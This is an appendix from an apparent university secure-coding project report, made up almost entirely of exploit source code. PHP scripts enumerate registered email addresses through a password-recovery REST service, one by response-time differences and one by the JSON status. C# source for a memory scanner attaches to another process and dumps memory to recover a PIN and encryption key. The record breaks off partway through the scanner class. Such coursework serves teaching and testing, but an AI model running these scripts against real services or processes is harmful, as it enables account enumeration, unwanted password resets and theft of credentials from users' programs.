\chapter{PHP Scripts for Exploiting Vulnerability OTG-BUSLOGIC-004}

\section{PHP Script  for Calculating the response time average of the password recovery service for valid an invalid response email addresses}
\label{appendix:average}


The script uses the function "curl" to send a POST-Request to the Rest-Service "ForgotPassword". The two parameters of this POST Request are the name of the service and the email address for which an new password should be set. With "$responseTime = curl_getinfo($curl,CURLINFO\_TOTAL\_TIME" we can get the response time for this request. This request are sent 100 times for each a valid and an invalid email address. For each an average is computed an shown in the bash.

\begin{lstlisting}
<?php

$validResponseTime = 0.0;
$invalidResponseTime = 0.0;
for ($i = 1; $i <= 100; $i++) {
$validResponseTime += responseTimeForRequest("employee@next9.com");
}
$validAverage = $validResponseTime/100;
echo "Average Response Time for valid address: ".$validAverage."\n";

for ($i = 1; $i <= 100; $i++) {
$invalidResponseTime += responseTimeForRequest("abc@next9.com");
}
$invalidAverage = $invalidResponseTime/100;
echo "Average Response Time for invalid address: ".$invalidAverage."\n";

function responseTimeForRequest($email) {
$service_url = 'https://192.168.56.101/rest/index';
$curl = curl_init($service_url);
$curl_post_data = array(
'service' => "forgotPassword",
'email' => $email );

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $curl_post_data);
$curl_response = curl_exec($curl);
return $responseTime = curl_getinfo($curl,CURLINFO_TOTAL_TIME);
}

?>
\end{lstlisting}

\chapter{PHP Script for validating email address via response time}
\label{appendix:validate_via_time}

This script decides due to the response time of the an request if an email address is belonging to an existing account or not. The response is received like mentioned in the Script above. If the response is bigger than the threshold, it will be handled as valid and printed to the shell.
\begin{lstlisting}
	<?php
	
	if(!$argv[1])
	die("Please provide list of email adresses");
	$emailList = file($argv[1], FILE_IGNORE_NEW_LINES);
	
	if(!$argv[2])
	die("Please provide threshold");
	
	$threshold = floatval($argv[2]);
	
	echo "Valid Accounts:\n";
	foreach($emailList as $email)        
	if (validateEmail($email,$threshold))
	echo $email."\n";
	
	function validateEmail($email,$threshold) {
	$service_url = 'https://192.168.56.101/rest/index';
	$curl = curl_init($service_url);
	$curl_post_data = array(
	'service' => "forgotPassword",
	'email' => $email );
	
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $curl_post_data);
	$curl_response = curl_exec($curl);
	$responseTime = curl_getinfo($curl,CURLINFO_TOTAL_TIME);
	
	if($responseTime > $threshold)
	return true;
	else
	return false;  
	}
	
	?>
\end{lstlisting}

\chapter{PHP Scripts for exploiting Vulnerability OTG-IDENT-004}
\section{PHP Script for validating email address via response of REST Service}
\label{appendix:validate_via_response}

This Script takes a list of email addresses and prints all of them which are already registered in the system to the shell. To do so it sends a POST Request like the scripts above to the REST Service "forgotPassword". After that it parsed the response, represented by a JSON File. If the field status of this field equals 1, the app generated a new password and sent it via email to the provided address. Else
the provided email denied.
\begin{lstlisting}
<?php

if(!$argv[1])
die("Please provide list of email adresses");
$emailList = file($argv[1], FILE_IGNORE_NEW_LINES);

echo "Valid Accounts:\n";
foreach($emailList as $email)        
if (validateEmail($email))
echo $email."\n";

function validateEmail($email) {
$service_url = 'https://192.168.56.101/rest/index';
$curl = curl_init($service_url);
$curl_post_data = array(
'service' => "forgotPassword",
'email' => $email );

curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $curl_post_data);
$curl_response = curl_exec($curl);
if ($curl_response === false) {
$info = curl_getinfo($curl);
curl_close($curl);
die('error occured during curl exec. Additioanl info: ' . var_export($info));
}
curl_close($curl);
$decoded = json_decode($curl_response,true);
if ($decoded['status']['code'] == 1) {
//die('error occured: ' . $decoded->response->errormessage);
return true;
}
else {
return false;
}
}

?>
\end{lstlisting}

\chapter{Memory Scan Exploit}

The following pages contain the C\# source code for the memory scan exploit of the Java-SCS, which reads the PIN from the memory of the SCS program.

\section{Program}

\begin{lstlisting}
/* 
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace SecCodeSCSExploit
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new SCSReaderForm());
        }
    }
}
\end{lstlisting}

\section{SCSReaderForm}

\begin{lstlisting}
/* 
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 */

namespace SecCodeSCSExploit
{
    /* UI Code, mostly generated */
    partial class SCSReaderForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.button1 = new System.Windows.Forms.Button();
            this.labelBaseAddress = new System.Windows.Forms.Label();
            this.progressBar1 = new System.Windows.Forms.ProgressBar();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.buttonOpenFolder = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.textBoxDumpSizeBytes = new System.Windows.Forms.TextBox();
            this.radioButtonUpwards = new System.Windows.Forms.RadioButton();
            this.radioButtonDownwards = new System.Windows.Forms.RadioButton();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.textBoxStartAddress = new System.Windows.Forms.TextBox();
            this.textBoxEndAddress = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.SuspendLayout();
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(13, 13);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(113, 23);
            this.button1.TabIndex = 0;
            this.button1.Text = "Scan";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // labelBaseAddress
            // 
            this.labelBaseAddress.AutoSize = true;
            this.labelBaseAddress.Location = new System.Drawing.Point(132, 18);
            this.labelBaseAddress.Name = "labelBaseAddress";
            this.labelBaseAddress.Size = new System.Drawing.Size(74, 13);
            this.labelBaseAddress.TabIndex = 1;
            this.labelBaseAddress.Text = "base Address:";
            // 
            // progressBar1
            // 
            this.progressBar1.Location = new System.Drawing.Point(13, 44);
            this.progressBar1.Name = "progressBar1";
            this.progressBar1.Size = new System.Drawing.Size(529, 23);
            this.progressBar1.TabIndex = 3;
            // 
            // textBox1
            // 
            this.textBox1.AcceptsReturn = true;
            this.textBox1.AcceptsTab = true;
            this.textBox1.ForeColor = System.Drawing.SystemColors.InfoText;
            this.textBox1.Location = new System.Drawing.Point(13, 74);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.ReadOnly = true;
            this.textBox1.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox1.Size = new System.Drawing.Size(529, 371);
            this.textBox1.TabIndex = 4;
            // 
            // buttonOpenFolder
            // 
            this.buttonOpenFolder.Location = new System.Drawing.Point(422, 13);
            this.buttonOpenFolder.Name = "buttonOpenFolder";
            this.buttonOpenFolder.Size = new System.Drawing.Size(120, 23);
            this.buttonOpenFolder.TabIndex = 5;
            this.buttonOpenFolder.Text = "Open Dump Folder";
            this.buttonOpenFolder.UseVisualStyleBackColor = true;
            this.buttonOpenFolder.Click += new System.EventHandler(this.buttonOpenFolder_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.textBoxDumpSizeBytes);
            this.groupBox1.Location = new System.Drawing.Point(13, 452);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(113, 48);
            this.groupBox1.TabIndex = 6;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Area Size (Bytes)";
            // 
            // textBoxDumpSizeBytes
            // 
            this.textBoxDumpSizeBytes.Location = new System.Drawing.Point(6, 19);
            this.textBoxDumpSizeBytes.Name = "textBoxDumpSizeBytes";
            this.textBoxDumpSizeBytes.Size = new System.Drawing.Size(100, 20);
            this.textBoxDumpSizeBytes.TabIndex = 0;
            this.textBoxDumpSizeBytes.Text = "1024";
            // 
            // radioButtonUpwards
            // 
            this.radioButtonUpwards.AutoSize = true;
            this.radioButtonUpwards.Checked = true;
            this.radioButtonUpwards.Location = new System.Drawing.Point(6, 19);
            this.radioButtonUpwards.Name = "radioButtonUpwards";
            this.radioButtonUpwards.Size = new System.Drawing.Size(39, 17);
            this.radioButtonUpwards.TabIndex = 2;
            this.radioButtonUpwards.TabStop = true;
            this.radioButtonUpwards.Text = "Up";
            this.radioButtonUpwards.UseVisualStyleBackColor = true;
            // 
            // radioButtonDownwards
            // 
            this.radioButtonDownwards.AutoSize = true;
            this.radioButtonDownwards.Location = new System.Drawing.Point(52, 19);
            this.radioButtonDownwards.Name = "radioButtonDownwards";
            this.radioButtonDownwards.Size = new System.Drawing.Size(53, 17);
            this.radioButtonDownwards.TabIndex = 3;
            this.radioButtonDownwards.Text = "Down";
            this.radioButtonDownwards.UseVisualStyleBackColor = true;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.radioButtonUpwards);
            this.groupBox2.Controls.Add(this.radioButtonDownwards);
            this.groupBox2.Location = new System.Drawing.Point(135, 452);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(113, 48);
            this.groupBox2.TabIndex = 7;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Dump Direction";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.label2);
            this.groupBox3.Controls.Add(this.label1);
            this.groupBox3.Controls.Add(this.textBoxEndAddress);
            this.groupBox3.Controls.Add(this.textBoxStartAddress);
            this.groupBox3.Location = new System.Drawing.Point(254, 452);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(288, 48);
            this.groupBox3.TabIndex = 8;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Search Area";
            // 
            // textBoxStartAddress
            // 
            this.textBoxStartAddress.Location = new System.Drawing.Point(42, 19);
            this.textBoxStartAddress.Name = "textBoxStartAddress";
            this.textBoxStartAddress.Size = new System.Drawing.Size(100, 20);
            this.textBoxStartAddress.TabIndex = 0;
            this.textBoxStartAddress.Text = "00000000";
            // 
            // textBoxEndAddress
            // 
            this.textBoxEndAddress.Location = new System.Drawing.Point(170, 19);
            this.textBoxEndAddress.Name = "textBoxEndAddress";
            this.textBoxEndAddress.Size = new System.Drawing.Size(100, 20);
            this.textBoxEndAddress.TabIndex = 1;
            this.textBoxEndAddress.Text = "1CCCCCCC";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(148, 22);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(16, 13);
            this.label1.TabIndex = 2;
            this.label1.Text = "to";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(6, 22);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(30, 13);
            this.label2.TabIndex = 3;
            this.label2.Text = "From";
            // 
            // SCSReaderForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(554, 524);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.buttonOpenFolder);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.progressBar1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.labelBaseAddress);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = "SCSReaderForm";
            this.ShowIcon = false;
            this.Text = "SCS Memory Scanner/Analyzer";
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Label labelBaseAddress;
        private System.Windows.Forms.ProgressBar progressBar1;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Button buttonOpenFolder;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.TextBox textBoxDumpSizeBytes;
        private System.Windows.Forms.RadioButton radioButtonUpwards;
        private System.Windows.Forms.RadioButton radioButtonDownwards;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox textBoxEndAddress;
        private System.Windows.Forms.TextBox textBoxStartAddress;
    }
}
\end{lstlisting}

\section{SCSReaderForm}

\begin{lstlisting}
/* 
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 */

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;

namespace SecCodeSCSExploit
{
    /* The SCSReaderForm handles the user interface of the application.
     * It is responsible for "hooking" the target process and starting the SCSMemoryReader as a separate thread.
     * 
     * It also subscribes to the MemoryReaders message & progress events, which are then relayed to the user,
     * via the form controls.
     */
    public partial class SCSReaderForm : Form
    {
        #region Members
        SCSMemoryReader SCSMemReader;
        Thread t;
        private int progress;

        private int dumpSizeBytes;
        private int addressBegin;
        private int addressEnd;
        private bool upwardsDump;
        #endregion

        #region Constructor
        public SCSReaderForm()
        {
            InitializeComponent();

            // Initialize Form Controls depending on Settings
            this.textBoxDumpSizeBytes.Text = Settings.dumpSizeBytes.ToString();
            this.textBoxStartAddress.Text = Settings.addressBegin;
            this.textBoxEndAddress.Text = Settings.addressEnd;
            this.radioButtonUpwards.Checked = Settings.upwardsDump;
            this.radioButtonDownwards.Checked = !Settings.upwardsDump;
        }
        #endregion

        #region Methods
        // Validate form input
        public bool validateInput()
        {
            // START ADDRESS VALIDATION
            // Check Start Address Empty
            if (this.textBoxStartAddress.Text == "")
            {
                MessageBox.Show("Start Address can not be empty.", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                return false;
            }

            try
            {
                // Parse Start address
                int startAddressTemp = int.Parse(this.textBoxStartAddress.Text, System.Globalization.NumberStyles.HexNumber);

                // Check Start Address in range
                if (startAddressTemp == -1)
                {
                    MessageBox.Show("Start Address must be a value between '0' and '7FFFFFFF'", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                    return false;
                }

                // Set Start Address
                this.addressBegin = startAddressTemp;
            }
            catch (System.FormatException)
            {
                MessageBox.Show("Start Address must be a value between '0' and '7FFFFFFF'", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                return false;
            }



            // END ADDRESS VALIDATION
            // Check End Address Empty
            if (this.textBoxEndAddress.Text == "")
            {
                MessageBox.Show("End Address can not be empty.", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                return false;
            }

            try
            {
                // Parse End address
                int endAddressTemp = int.Parse(this.textBoxEndAddress.Text, System.Globalization.NumberStyles.HexNumber);
                // Check End Address in range
                if (endAddressTemp == -1)
                {
                    MessageBox.Show("End Address must be a value between '0' and '7FFFFFFF'", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                    return false;
                }

                // Set End Address
                this.addressEnd = endAddressTemp;
            }
            catch (System.FormatException)
            {
                MessageBox.Show("End Address must be a value between '0' and '7FFFFFFF'", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                return false;
            }


            // MEMORY AREA VALIDATION
            // Check memory area dump size Empty
            if (this.textBoxDumpSizeBytes.Text == "")
            {
                MessageBox.Show("Memory area dump size can not be empty.", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                return false;
            }

            try
            {
                // Parse memory area dump size
                int dumpSizeBytesTemp = int.Parse(this.textBoxDumpSizeBytes.Text);

                // Check memory area dump size in range
                if (dumpSizeBytesTemp > 10000000 || dumpSizeBytesTemp < 0)
                {
                    MessageBox.Show("Memory area dump size must be a value between '0' and '10000000'", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                    return false;
                }

                // Set memory area size
                this.dumpSizeBytes = dumpSizeBytesTemp;
            }
            catch (System.FormatException)
            {
                MessageBox.Show("Memory area dump size must be a value between '0' and '10000000'", "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
                return false;
            }



            // Set dump direction
            this.upwardsDump = this.radioButtonUpwards.Checked;

            return true;
        }

        private void updateProgress()
        {
            if (progressBar1.InvokeRequired)
                progressBar1.Invoke(new Action(updateProgress));
            else
                progressBar1.Value = this.progress;
        }

        private void updateTextbox(String message, bool newLine)
        {
            if (newLine)
                message += "\r\n";

            if (this.textBox1.InvokeRequired)
                textBox1.Invoke(new Action (() => this.textBox1.Text = this.textBox1.Text + message + "\n"));
            else
                this.textBox1.Text = this.textBox1.Text + message;
        }

        private bool hookProcess(String processName)
        {
            // Optional: Do clean up
            if (SCSMemReader != null)
            {
                // Terminate the working thread
                if (t != null)
                {
                    t.Abort();
                }

                // Clear previous output
                this.textBox1.Clear();

                // Close process handle
                if (this.SCSMemReader.closeHandle())
                    this.textBox1.Text = this.textBox1.Text + "Successfully closed existing process handle.\r\n";
                else
                    this.textBox1.Text = this.textBox1.Text + "Unable to close existing process handle.\r\n";
            }

            if (validateInput())
            {
                // Create a new Memory Reader
                this.SCSMemReader = new SCSMemoryReader(this.addressBegin, this.addressEnd, this.dumpSizeBytes, this.upwardsDump);

                // Hook the specified process and obtain base address
                if (SCSMemReader.hookProcess(Settings.processName))
                {
                    this.textBox1.Text = this.textBox1.Text + "Successfully hooked process \"" + Settings.processName + "\"\r\n";
                    this.labelBaseAddress.Text = "baseAddress: " + SCSMemReader.basePtr.ToString("X");
                    return true;
                }

                else
                {
                    this.textBox1.Text = this.textBox1.Text + "Failed to hook process " + Settings.processName + "\r\n";
                    return false;
                }
            }
            return false;
        }

        private void scanMemory()
        {
            // Subscribe to progress change events
            SCSMemReader.ProgressChanged += new SCSMemoryReader.ProgressChangedEventHandler(SCSMemReader_ProgressChanged);
            // Subscribe to message events
            SCSMemReader.MessagePending += new SCSMemoryReader.MessagePendingEventHandler(SCSMemReader_MessagePending);

            t = new Thread(new ThreadStart(SCSMemReader.scanMemory));
            t.Start();
        }
        #endregion

        #region Event Callback Methods
        private void button1_Click(object sender, EventArgs e)
        {
            if (hookProcess(Settings.processName))
            {
                scanMemory();
            }
        }

        private void SCSMemReader_ProgressChanged(object sender, MemoryScanner.ProgressChangedEventArgs e)
        {
            this.progress = e.Progress;
            updateProgress();
        }

        private void SCSMemReader_MessagePending(object sender, MemoryScanner.MessagePendingEventArgs e)
        {
            updateTextbox(e.Message, e.NewLine);
        }

        private void buttonOpenFolder_Click(object sender, EventArgs e)
        {
            Process.Start(Application.StartupPath);
        }
        #endregion
    }
}

\end{lstlisting}

\section{ReadMem}

\begin{lstlisting}
/*
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;

namespace SecCodeSCSExploit
{
    /* Standard Implementation for reading process memory via C#, used by the MemoryScanner */
    public class ReadMem
    {
        #region Members
        // handle to the hooked process
        public int processHandle;
        #endregion

        #region DLL Imports
        [DllImport("kernel32.dll")]
        public static extern int OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] buffer, int size, int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(int hProcess, int lpBaseAddress, byte[] buffer, int size, int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern Int32 CloseHandle(IntPtr hObject);
        #endregion

        #region Methods
        public ReadMem( Process p )
        {
            uint DELETE = 0x00010000;
            uint READ_CONTROL = 0x00020000;
            uint WRITE_DAC = 0x00040000;
            uint WRITE_OWNER = 0x00080000;
            uint SYNCHRONIZE = 0x00100000;
            uint END = 0xFFF; // Change to 0xFFFF for WinXP/Server2003
            uint PROCESS_ALL_ACCESS = (DELETE |
                       READ_CONTROL |
                       WRITE_DAC |
                       WRITE_OWNER |
                       SYNCHRONIZE |
                       END
                     );

            this.processHandle = OpenProcess( PROCESS_ALL_ACCESS, false, p.Id );
        }

        public static byte[] ReadMemory( int adress, int processSize, int processHandle )
        {
            byte[] buffer = new byte[ processSize ];
            ReadProcessMemory( processHandle, adress, buffer, processSize, 0 );
            return buffer;
        }

        public static void WriteMemory( int adress, byte[] processBytes, int processHandle )
        {
            WriteProcessMemory( processHandle, adress, processBytes, processBytes.Length, 0 );
        }


        public static int GetObjectSize( object TestObject )
        {
            BinaryFormatter bf = new BinaryFormatter();
            MemoryStream ms = new MemoryStream();
            byte[] Array;
            bf.Serialize( ms, TestObject );
            Array = ms.ToArray();
            return Array.Length;
        }

        public bool CloseHandle()
        {
            try
            {
                int iRetValue;
                iRetValue = CloseHandle((IntPtr)this.processHandle);
                if (iRetValue == 0)
                {
                    throw new Exception("Failed to close process handle.");
                }

                else
                {
                    return true;
                }
            }
            catch (Exception ex)
            {
                System.Windows.Forms.MessageBox.Show(ex.Message, "Warning", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Warning);
            }
            return false;
        }
        #endregion
    }
}
\end{lstlisting}

\section{SCSMemoryReader}

\begin{lstlisting}
/* 
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace SecCodeSCSExploit
{
    /* The SCSMemoryReader uses the MemoryScanner to find a specified value in memory. It acts as a mediator between user UI and MemoryScanner.
     * It is also responsible for dumping the memory around the "area of interest" (i.e. addresses found by the MemoryScanner).
     */
    class SCSMemoryReader
    {
        #region Members
        // ReadMem provides Memory hooking / reading / writing functionality
        ReadMem readMem;

        // Base Pointer for main program module
        public IntPtr basePtr;

        // Starting Address
        private int addressBegin;
        // Ending Address
        private int addressEnd;
        // Direction of dump
        private bool upwardsDump; // true = upwards, false = downwards
        // Size of dump area in bytes
        private int dumpSizeBytes = 1024;
        #endregion

        #region Delegates & Events
        // Progress changed event delegate
        public delegate void ProgressChangedEventHandler(object sender, MemoryScanner.ProgressChangedEventArgs e);
        // Progress changed event
        public event ProgressChangedEventHandler ProgressChanged;

        // Message pending event delegate
        public delegate void MessagePendingEventHandler(object sender, MemoryScanner.MessagePendingEventArgs e);
        // Message pending event
        public event MessagePendingEventHandler MessagePending;
        #endregion

        #region Constructor
        // Create a new SCS Memory Reader
        public SCSMemoryReader(int addressBegin, int addressEnd, int dumpSizeBytes, bool upwardsDump)
        {
            this.addressBegin = addressBegin;
            this.addressEnd = addressEnd;
            this.dumpSizeBytes = dumpSizeBytes;
            this.upwardsDump = upwardsDump;
        }
        #endregion

        #region Methods

        // Hook the javaw SCS process and obtain its base address
        public bool hookProcess( String processName )
        {
            Process[] p = Process.GetProcessesByName( processName );
            if ( p.Length > 0 )
            {
                readMem = new ReadMem( p[0] );
                basePtr = p[0].MainModule.BaseAddress;

                return true;
            }
            else
            {
                return false;
            }
        }

        // Close process handle
        public bool closeHandle()
        {
            if (readMem != null)
            {
                return readMem.CloseHandle();
            }

            else
            {
                return false;
            }
        }

        // Scan memory for a certain value and dump the memory around it
        public void scanMemory()
        {
            // Define the value (byte sequence) to look for in memory (in this case the first 8 bytes of the static IV, ASCII encoded)
            Int64 searchValue = BitConverter.ToInt64(Encoding.ASCII.GetBytes("fedcba9876543210"), 0);
            // Int64 searchValue = 4051376414998685030; // equals "fedcba98" 
            
            // Initialize memory scanner, passing starting and ending address, search value and an instance of the low level memory reader
            MemoryScanner memoryScanner = new MemoryScanner(readMem, (IntPtr)addressBegin, (IntPtr)addressEnd, searchValue);
            
            // Subscribe to progress change events
            memoryScanner.ProgressChanged += new MemoryScanner.ProgressChangedEventHandler(memoryScanner_ProgressChanged);
            
            // Subscribe to message events
            memoryScanner.MessagePending += new MemoryScanner.MessagePendingEventHandler(memoryScanner_MessagePending);

            // Scan memory
            memoryScanner.scan();

            // Dump memory around the found occurences (likely to contain encryption key / user pin in plaintext)
            dumpMemoryArea(memoryScanner.FoundAddresses);
        }

        // Dump the memory around a certain address (showing that it contains sensitive information in plain text)
        public void dumpMemoryArea(List<int> addresses)
        {
            foreach (int address in addresses) 
            {
                MessagePending(this, new MemoryScanner.MessagePendingEventArgs(address.ToString("X") + ".txt >    Dumping memory area for address " + address.ToString("X") + " to file.", true));

                byte[] dump;
                if (this.upwardsDump)
                    dump = ReadMem.ReadMemory(address - this.dumpSizeBytes - 10, this.dumpSizeBytes, readMem.processHandle);
                else
                    dump = ReadMem.ReadMemory(address, this.dumpSizeBytes, readMem.processHandle);

                MemoryStream ms = new MemoryStream(dump);
                FileStream file = new FileStream(address.ToString("X") + ".txt", FileMode.Create, FileAccess.Write);
                ms.WriteTo(file);
                file.Close();
                ms.Close();
            }
        }
        #endregion

        #region Event Callback Methods
        public void memoryScanner_ProgressChanged(object sender, MemoryScanner.ProgressChangedEventArgs e)
        {
            ProgressChanged(this, e);
        }

        public void memoryScanner_MessagePending(object sender, MemoryScanner.MessagePendingEventArgs e)
        {
            MessagePending(this, e);
        }
        #endregion
    }
}

\end{lstlisting}

\section{MemoryScanner}

\begin{lstlisting}
/* 
 * SCS Memory Reader / Analyzer
 * Lecture: Secure Coding, Team 7, Phase 4
 * Chair XXII Software Engineering, Department of Computer Science TU München
 *
 * Author: Elias Tatros
 * This class is inspired by the article "How to write a Memory Scanner", Rojan Gh., on codeproject.com.
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SecCodeSCSExploit
{
    /* High-level implementation of the memory scanner. Searches a specified value in memory using the low-level ReadMem API.
     * Addresses that contained the search value are stored in a list.
     * Currently only supports 8 byte values (Int64), which in our case is sufficient to identify memory
     * locations of the static IV (or other interesting Strings/data).
     */
    public class MemoryScanner
    {
        #region Members
        // Memory Reader used
        ReadMem reader;

        // The value we are searching in memory
        Int64 searchValue;

        // Size of the search value in bytes
        int searchValueBytesCount;

        // Size of search value in bytes
        // minus the one byte we are moving with each scan
        int scanDifference;

        // List of addresses that contained the search value
        List<int> foundAddresses;

        // The point in memory we start scanning at
        IntPtr lastAddress;
        // The point in memory where we stop scanning
        IntPtr baseAddress;
        // The size of the memory area we are scanning
        int scanAreaSize;

        // The size of the memory blocks read in one interation in bytes
        int readBufferSize;
        #endregion

        #region Delegates & Events
        // progress changed delegate
        public delegate void ProgressChangedEventHandler(object sender, ProgressChangedEventArgs e);
        // progress changed event
        public event ProgressChangedEventHandler ProgressChanged;

        // Message pending delegate
        public delegate void MessagePendingEventHandler(object sender, MessagePendingEventArgs e);
        // Message pending event
        public event MessagePendingEventHandler MessagePending;
        #endregion

        #region Event Args
        // progress changed event args
        public class ProgressChangedEventArgs : EventArgs
        {
            private int progress;

            public ProgressChangedEventArgs(int progress)
            {
                this.progress = progress;
            }

            public int Progress
            {
                get
                {
                    return progress;
                }

                set
                {
                    progress = value;
                }
            }
        }

        // Message pending event args
        public class MessagePendingEventArgs : EventArgs
        {
            private String message;
            private bool newLine;

            public MessagePendingEventArgs(String message, bool newLine)
            {
                this.message = message;
                this.newLine = newLine;
            }

            public bool NewLine
            {
                get
                {
                    return this.newLine;
                }

                set
                {
                    this.newLine = value;
                }
            }

            public String Message
